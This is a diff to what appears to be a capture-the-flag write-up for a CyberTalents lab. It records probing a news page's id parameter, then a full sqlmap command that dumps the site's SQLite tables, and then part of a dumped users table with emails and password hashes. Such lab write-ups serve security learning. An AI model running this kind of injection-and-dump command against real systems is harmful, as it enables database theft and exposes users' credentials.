@@ -5,7 +5,7 @@ when clicking on any read more , noticed  ?id=number  like ?id=1
 try to bruteforce from 1 to 200 > it is just news 
 
 tried to path traversed > sqlite error 😂
-
+```
 using sqlmap sudo sqlmap  -u http://cdcamxwl32pue3e6mk873oykcwzy0w93xgr9gt7zr-web.cybertalentslabs.com/shownews.php?id=1 --batch --dbms=sqlite --tables --dump
 
 
@@ -36,3 +36,4 @@ Table: nxf8_users
 | 19 | Christina | user  | christina@secret.org | cff09074e8c00957465b16545b4fbd920ec34117 |
 | 20 | Gabriel   | user  | gabriel@secret.org   | efcf1d468836853b87b0e7f80733ba20cf509310 |
 +----+-----------+-------+----------------------+------------------------------------------+
+```
